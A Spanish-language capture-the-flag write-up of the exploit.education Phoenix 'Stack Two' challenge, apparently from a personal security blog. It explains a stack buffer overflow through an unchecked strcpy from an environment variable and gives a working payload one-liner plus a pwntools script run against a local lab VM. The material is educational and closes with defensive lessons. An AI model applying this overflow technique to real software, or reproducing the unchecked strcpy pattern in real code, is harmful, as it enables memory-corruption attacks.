---
layout: single
title: "Stack Two"
permalink: /pwn/phoenix/stack-two/
parent: Phoenix
comments: true
excerpt: "Stack Two"
classes: wide
header:
  teaser: /assets/images/2025-08-17-Phoenix/logo.jpg
categories: [PWN]
tags: [PWN, Linux, Hacking, Easy]
---

![Untitled](/assets/images/2025-08-17-Phoenix/banner.png)

En **Stack Two** se introduce el uso de variables de entorno y cómo pueden ser manipuladas para explotar un desbordamiento de buffer.


## Análisis del código fuente

El objetivo es modificar la variable changeme con el valor 0x0d0a090a. Para lograrlo, el programa copia sin validación el contenido de la variable de entorno ExploitEducation al buffer locals.buffer, lo que abre la puerta a un buffer overflow.


```c
/*
 * phoenix/stack-two, by https://exploit.education
 *
 * The aim is to change the contents of the changeme variable to 0x0d0a090a
 *
 * If you're Russian to get to the bathroom, and you are Finnish when you get
 * out, what are you when you are in the bathroom?
 *
 * European!
 */

#include <err.h>    // Biblioteca para manejo de errores (errx).
#include <stdio.h>  // Biblioteca estándar para entrada/salida.
#include <stdlib.h> // Biblioteca estándar para funciones generales como getenv() y exit().
#include <string.h> // Biblioteca para funciones de manipulación de cadenas como strcpy().
#include <unistd.h> // Biblioteca para funciones del sistema operativo POSIX.

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"
// Define un mensaje constante que se mostrará al inicio del programa.

int main(int argc, char **argv) { 
  // Función principal, recibe argumentos de línea de comandos.

  struct { 
    char buffer[64];          // Define un buffer de 64 bytes para almacenar datos.
    volatile int changeme;    // Variable que debe modificarse mediante un exploit.
  } locals;                   // Agrupa estas variables dentro de la estructura 'locals'.

  char *ptr; 
  // Apuntador para almacenar el valor de una variable de entorno.

  printf("%s\n", BANNER); 
  // Imprime el mensaje de bienvenida definido en BANNER.

  ptr = getenv("ExploitEducation"); 
  // Obtiene el valor de la variable de entorno "ExploitEducation".
  if (ptr == NULL) { 
    // Verifica si la variable de entorno no está configurada.
    errx(1, "please set the ExploitEducation environment variable"); 
    // Muestra un mensaje de error y termina el programa con el código de salida 1.
  }

  locals.changeme = 0; 
  // Inicializa la variable 'changeme' con el valor 0.

  strcpy(locals.buffer, ptr); 
  // Copia el contenido de la variable de entorno "ExploitEducation" en el buffer 'buffer'.
  // Vulnerabilidad: No verifica el tamaño del contenido, lo que permite un desbordamiento de buffer.

  if (locals.changeme == 0x0d0a090a) { 
    // Comprueba si el valor de 'changeme' coincide con el objetivo: 0x0d0a090a.
    puts("Well done, you have successfully set changeme to the correct value"); 
    // Si el valor es correcto, imprime un mensaje de éxito.
  } else { 
    printf("Almost! changeme is currently 0x%08x, we want 0x0d0a090a\n", locals.changeme); 
    // Si el valor no es el esperado, imprime el valor actual de 'changeme' y el valor deseado.
  }

  exit(0); 
  // Termina el programa correctamente con el código de salida 0.
}

```

**Ejecución del binario**

Si ejecutamos el binario sin definir la variable de entorno, aparece un mensaje de error:

```c
user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-two 
Welcome to phoenix/stack-two, brought to you by https://exploit.education
stack-two: please set the ExploitEducation environment variable
```

Definimos la variable con 64 caracteres de A y con esto ya nos da la respuesta de que la variable está en 0x00000000

```jsx
user@phoenix-amd64:/opt/phoenix/amd64$ export ExploitEducation=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-two 
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Almost! changeme is currently 0x00000000, we want 0x0d0a090a

```

**Confirmando el overflow**

Si añadimos BBBB (0x42 en ASCII) después de los 64 A, el valor de changeme cambia a 0x42424242: Esto confirma que estamos sobreescribiendo la variable.

```c
user@phoenix-amd64:/opt/phoenix/amd64$ export ExploitEducation=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-two 
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Almost! changeme is currently 0x42424242, we want 0x0d0a090a

```
**Explotación**

Ahora sobreescribimos con el valor solicitado 0x0d0a090a, cuidando el endianness (little-endian en x86): \x0A\x09\x0A\x0D y con esto confirmamos que se logra el reto


```c
user@phoenix-amd64:/opt/phoenix/amd64$ export ExploitEducation=$(python -c 'print "A"*64 + "\x0A\x09\x0A\x0D"')
user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-two 
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```

**Explotación con Pwntools**

También podemos automatizar este proceso con un script en Python

```c
┌──(root㉿angussMoody)-[/mnt/angussMoody/PWN/Phoenix/2_stack-two]
└─# cat Remote_exploit.py 
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: Remote_exploit.py
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ #!/usr/bin/env python3
   2   │ from pwn import *
   3   │ 
   4   │ # Define el payload
   5   │ payload = b"A" * 64
   6   │ payload += p32(0x0d0a090a)
   7   │ 
   8   │ # Establece conexión SSH
   9   │ ssh_connection = ssh(user='user', host='localhost', password='user', port=2222)
  10   │ 
  11   │ # Configura la variable de entorno 'ExploitEducation'
  12   │ env_vars = {"ExploitEducation": payload}
  13   │ 
  14   │ # Ejecuta el programa remoto con la variable de entorno configurada
  15   │ process = ssh_connection.process(executable='/opt/phoenix/amd64/stack-two', env=env_vars)
  16   │ 
  17   │ # Captura y muestra la salida
  18   │ flag = process.recvall().decode()
  19   │ log.success("Output: " + flag)
  20   │ 
  21   │ # Cierra la conexión
  22   │ process.close()
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────
```

Al ejecutar el exploit se evidencia el mensaje que indica que el reto fue resuelto

```c
┌──(root㉿angussMoody)-[/mnt/angussMoody/PWN/Phoenix/2_stack-two]
└─# python3 Remote_exploit.py 
[+] Connecting to localhost on port 2222: Done
[*] user@localhost:
    Distro    Unknown 
    OS:       linux
    Arch:     amd64
    Version:  4.9.0
    ASLR:     Disabled
    SHSTK:    Disabled
    IBT:      Disabled
    Note:     Susceptible to ASLR ulimit trick (CVE-2016-3672)
[+] Starting remote process '/opt/phoenix/amd64/stack-two' on localhost: pid 583
[!] ASLR is disabled for '/opt/phoenix/amd64/stack-two'!
[+] Receiving all data: Done (141B)
[*] Stopped remote process 'stack-two' on localhost (pid 583)
[+] Output: Welcome to phoenix/stack-two, brought to you by https://exploit.education
    Well done, you have successfully set changeme to the correct value
```

**Conclusión**

En Stack Two vimos cómo una variable de entorno puede ser aprovechada para provocar un desbordamiento de buffer y modificar variables internas del programa.

El reto refuerza dos ideas clave:

  - Las funciones inseguras como strcpy deben evitarse.

  - Variables de entorno pueden ser un vector de ataque si no se validan correctamente.

Con esta técnica pudimos manipular la variable changeme y completar el reto con éxito.